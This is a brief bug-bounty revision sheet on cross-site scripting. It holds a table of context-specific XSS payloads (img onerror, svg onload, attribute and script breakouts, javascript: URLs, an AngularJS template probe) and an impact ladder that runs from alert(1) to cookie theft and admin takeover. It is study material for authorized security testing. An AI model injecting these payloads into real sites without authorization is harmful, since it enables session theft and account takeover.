# XSS Quick Revision

## Core Formula

```text
Reflection
        ↓
Context
        ↓
Payload
        ↓
Execution
        ↓
Impact
```

---

## Context → Payload

| Context | Payload |
|----------|----------|
| HTML | `<img src=1 onerror=alert(1)>` |
| HTML | `<svg onload=alert(1)>` |
| Attribute | `" onmouseover="alert(1)` |
| JavaScript | `';alert(1)//` |
| Template Literal | `${alert(1)}` |
| href | `javascript:alert(1)` |
| AngularJS | `{{7*7}}` |

---

## Most Important Bug Bounty Questions

### Question 1

```text
Where Is My Input Reflected?
```

---

### Question 2

```text
What Context Am I In?
```

---

### Question 3

```text
Can I Execute JavaScript?
```

---

### Question 4

```text
What Can The Victim Do?
```

---

## Impact Ladder

```text
alert(1)
        ↓
Cookie Theft
        ↓
Credential Theft
        ↓
CSRF Bypass
        ↓
Account Takeover
        ↓
Admin Takeover
```

---

## Top PortSwigger Lessons

1. Context Determines Payload
2. Filters Can Be Bypassed
3. CSP Is Not Perfect
4. AngularJS Is Dangerous
5. Stored XSS > Reflected XSS
6. Impact Matters More Than alert(1)

---

# Personal Bug Bounty Formula

```text
Find Reflection
        ↓
Identify Context
        ↓
Execute Payload
        ↓
Demonstrate Impact
        ↓
Write Report
```